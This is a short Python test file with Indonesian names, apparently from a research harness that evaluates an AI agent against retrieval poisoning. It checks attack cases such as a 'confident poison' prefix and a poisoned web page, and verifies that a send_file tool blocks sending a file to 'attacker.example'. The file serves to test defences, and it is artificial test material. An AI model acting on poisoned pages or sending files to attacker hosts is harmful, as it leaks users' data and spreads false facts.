"""Tes cepat Minggu 1. Jalankan: pytest -q"""
import json
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "src"))
load = lambda name: json.load(open(ROOT / "data" / name, encoding="utf-8"))


def test_semua_target_lolos_cek():
    for t in load("targets.json"):
        assert all(t["checks"].values()), t["target_id"]


def test_dev_dan_test_tidak_berbagi_percakapan():
    s = load("split.json")
    assert not set(s["dev"]) & set(s["test"])
    assert len(s["dev"]) == 3 and len(s["dev"]) + len(s["test"]) == 10


def test_tiga_serangan_per_target():
    cases = load("poison_cases.json")
    assert len(cases) == 3 * len(load("targets.json"))


def test_frasa_A2_dev_tidak_muncul_di_test():
    a2 = [c for c in load("poison_cases.json") if c["attack"] == "A2_confident_poison"]
    dev = {c["confident_prefix"] for c in a2 if c["split"] == "dev"}
    test = {c["confident_prefix"] for c in a2 if c["split"] == "test"}
    assert dev and test and not dev & test


def test_halaman_racun_dan_bersih_hanya_beda_nilai():
    pages = ROOT / "data" / "external_pages"
    a = (pages / "T01-A3.html").read_text().splitlines()
    b = (pages / "T01-EXT-CLEAN.html").read_text().splitlines()
    beda = [i for i, (x, y) in enumerate(zip(a, b)) if x != y]
    assert len(a) == len(b) and len(beda) == 2  # baris page-id dan baris fakta


def test_send_file_memblokir_domain_attacker(tmp_path, monkeypatch):
    import tools
    monkeypatch.setattr(tools, "LOG", tmp_path / "log.jsonl")
    assert tools.send_file("a.txt", "attacker.example")["status"] == "blocked"
    assert tools.send_file("a.txt", "https://backup.example/x")["status"].startswith("ok")
    log = [json.loads(l) for l in (tmp_path / "log.jsonl").read_text().splitlines()]
    assert len(log) == 2 and not any(r["executed"] for r in log)
